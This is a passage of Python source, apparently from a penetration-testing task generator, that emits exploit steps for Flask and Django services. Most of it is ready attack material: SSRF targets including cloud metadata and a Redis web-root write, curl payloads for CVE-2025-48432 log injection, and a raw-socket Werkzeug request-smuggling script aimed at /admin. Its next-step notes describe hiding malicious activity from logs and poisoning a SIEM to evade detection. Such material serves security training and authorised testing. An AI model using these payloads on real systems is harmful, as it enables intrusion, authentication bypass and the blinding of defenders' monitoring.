                        'Scan internal network: @10.0.0.1, @10.0.0.2, etc.',
                        'Target cloud metadata: @169.254.169.254 (AWS), @metadata.google.internal (GCP)',
                        'Exploit Redis if found: @localhost:6379/CONFIG%20SET%20dir%20/var/www/html',
                        'Chain with other SSRF exploits for RCE'
                    ],
                    'notes': 'Flask HTTP parser inconsistency allows @ bypass. Works when Flask proxies to external URLs using user input.'
                }
            })

        # 16. Django log injection (CVE-2025-48432)
        if framework == 'django' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'django-log-injection-{port}',
                'name': 'Django Log Injection (CVE-2025-48432)',
                'type': 'manual',
                'metadata': {
                    'description': 'Inject ANSI codes and newlines into logs via unescaped request.path for SIEM poisoning',
                    'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'CVE'],
                    'alternatives': [
                        '# Vulnerable Django versions: < 4.2.22 / < 5.1.10 / < 5.2.2',
                        '# request.path is logged without escaping newlines/ANSI codes',
                        '',
                        '# Inject fake log entries:',
                        f'curl "{url}/%0A[INFO]%20Admin%20login%20successful%20from%20192.168.1.100"',
                        '',
                        '# Inject ANSI escape codes to hide malicious activity:',
                        f'curl "{url}/%1B[2K%1B[1A/actual_path"  # Clear previous line',
                        '',
                        '# Poison SIEM/log analysis:',
                        f'curl "{url}/%0A%0A[ALERT]%20False%20positive%20detected%20-%20ignore%20subsequent%20errors"',
                        '',
                        '# Multi-line injection:',
                        f'curl "{url}/%0A%5B2025-10-07%2012:00:00%5D%20INFO%20-%20System%20check%20passed%0A"',
                        '',
                        '# Inject credentials in logs for later harvesting:',
                        f'curl "{url}/%0A%23%20Debug:%20SECRET_KEY=leaked_key_here%0A"',
                        '',
                        '# URL-encoded newline: %0A',
                        '# URL-encoded ANSI escape: %1B',
                        '# URL-encoded [: %5B',
                        '# URL-encoded ]: %5D'
                    ],
                    'success_indicators': [
                        'Fake log entries appear in Django logs',
                        'ANSI codes processed by terminal',
                        'Log analysis tools confused',
                        'Previous log lines hidden',
                        'False security alerts created'
                    ],
                    'failure_indicators': [
                        'Django >= 4.2.22 / 5.1.10 / 5.2.2 (patched)',
                        'Newlines escaped in logs',
                        'ANSI codes stripped',
                        'URL decoding prevented'
                    ],
                    'next_steps': [
                        'Fingerprint Django version: X-Frame-Options error page',
                        'Inject fake admin login success to bypass monitoring',
                        'Hide malicious requests by clearing log lines with ANSI codes',
                        'Poison SIEM with false positives to train bad detection',
                        'If logs stored in database, chain with SQL injection',
                        'Harvest logged credentials from debug entries'
                    ],
                    'notes': 'CVE-2025-48432 allows log injection via request.path. Useful for SIEM evasion and log poisoning. Fixed June 2025.'
                }
            })

        # 17. Werkzeug CL.0 request smuggling (Unicode headers)
        if framework == 'flask' or framework == 'unknown':
            post_exploit_parent['children'].append({
                'id': f'werkzeug-smuggling-{port}',
                'name': 'Werkzeug Unicode CL.0 Request Smuggling',
                'type': 'manual',
                'metadata': {
                    'description': 'Exploit Werkzeug Unicode header bug for CL.0 request smuggling with Connection: keep-alive',
                    'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'HTTP_SMUGGLING'],
                    'alternatives': [
                        '# Werkzeug bug: Unicode in headers breaks request, but keeps connection open',
                        '# Body is NOT read, treated as next HTTP request',
                        '',
                        '# Basic CL.0 smuggling payload:',
                        'POST / HTTP/1.1',
                        f'Host: {target}:{port}',
                        'Connection: keep-alive',
                        'Content-Length: 100',
                        'X-Unicode-Header: \u0301',  # Unicode character breaks Werkzeug
                        '',
                        'GET /admin HTTP/1.1',
                        f'Host: {target}:{port}',
                        '',
                        '',
                        '# Python script to send smuggled request:',
                        'import socket',
                        f's = socket.socket()',
                        f's.connect(("{target}", {port}))',
                        'payload = b"POST / HTTP/1.1\\r\\n"',
                        f'payload += b"Host: {target}:{port}\\r\\n"',
                        'payload += b"Connection: keep-alive\\r\\n"',
                        'payload += b"Content-Length: 100\\r\\n"',
                        'payload += b"X-Header: \\xcc\\x81\\r\\n"  # Unicode ́',
                        'payload += b"\\r\\n"',
                        'payload += b"GET /admin HTTP/1.1\\r\\n"',
                        f'payload += b"Host: {target}\\r\\n\\r\\n"',
                        's.send(payload)',
                        'print(s.recv(4096).decode())',
                        '',
                        '# Chain with XSS/CSRF:',
                        '# Smuggle admin request using victim session'
                    ],
                    'success_indicators': [
                        'First request breaks but connection stays open',
                        'Smuggled request executed',
                        'Admin endpoint accessed',
                        'Response contains data from smuggled request',
                        'Session hijacking successful'
                    ],
                    'failure_indicators': [
                        'Connection closed after first request',
                        'Unicode handled correctly',
                        'Werkzeug patched version',
                        'HTTP/2 used (smuggling harder)'
                    ],
                    'next_steps': [
                        'Test with different Unicode characters: \\u0301, \\u0308, \\xcc\\x81',
                        'Use Connection: keep-alive to persist connection',
                        'Smuggle requests to admin endpoints',
                        'Chain with CSRF for victim exploitation',
                        'Bypass authentication by smuggling authenticated requests',
                        'Poison web cache if present'
                    ],
                    'notes': 'Werkzeug Unicode bug + keep-alive = request smuggling. Body becomes next request. Allows auth bypass and cache poisoning.'
                }
            })

        tasks['children'].append(post_exploit_parent)

        # RESEARCH PHASE
        if version:
            research_parent = {
                'id': f'python-research-{port}',
                'name': f'Vulnerability Research: {product} {version}',
                'type': 'parent',
                'children': [
                    {
                        'id': f'python-searchsploit-{port}',
                        'name': f'SearchSploit: {product} {version}',
                        'type': 'command',
                        'metadata': {
                            'command': f'searchsploit "{product} {version}"',
                            'description': 'Search ExploitDB for known Python framework exploits',
                            'tags': ['OSCP:HIGH', 'RESEARCH'],
                            'flag_explanations': {
                                'searchsploit': 'ExploitDB search tool',
                                product: 'Framework name',
                                version: 'Version to search for'
                            },
                            'alternatives': [
                                f'searchsploit flask werkzeug',
                                f'searchsploit django',
                                'Browse https://www.exploit-db.com/'
                            ]
                        }
                    },
                    {
                        'id': f'python-cve-{port}',
                        'name': f'CVE Lookup: {product}',
                        'type': 'manual',
                        'metadata': {
                            'description': f'Research known CVEs for {product}',
                            'tags': ['RESEARCH', 'OSCP:MEDIUM'],
                            'alternatives': [
                                f'Google: "{product} {version} CVE"',
                                'https://nvd.nist.gov/',
                                'https://cve.mitre.org/',
                                'https://security.snyk.io/vuln/pip',
                                'Check framework security advisories',
                                'Known CVEs:',
                                '  Django:',
                                '    - CVE-2024-42005: SQL injection JSONField (CVSS 9.8, <4.2.15/<5.0.8)',
                                '    - CVE-2025-48432: Log injection via request.path (<4.2.22/<5.1.10/<5.2.2)',
                                '  Flask/Werkzeug:',
                                '    - Werkzeug Unicode CL.0 smuggling (no CVE)',
                                '    - Flask @ SSRF proxy bypass (no CVE)',
                                '  Python Libraries:',
                                '    - CVE-2023-33733: ReportLab RCE (<=3.6.12)',
                                '    - CVE-2024-3660: Keras Lambda RCE',
                                '    - CVE-2025-1550: Keras arbitrary import (<=3.8)',
                                '    - CVE-2025-50182: PyScript urllib3 SSRF (<2.5.0)',
                                '    - CVE-2022-30286: PyScript file exfiltration'
                            ]
                        }
                    }
                ]
            }
            tasks['children'].append(research_parent)

        return tasks
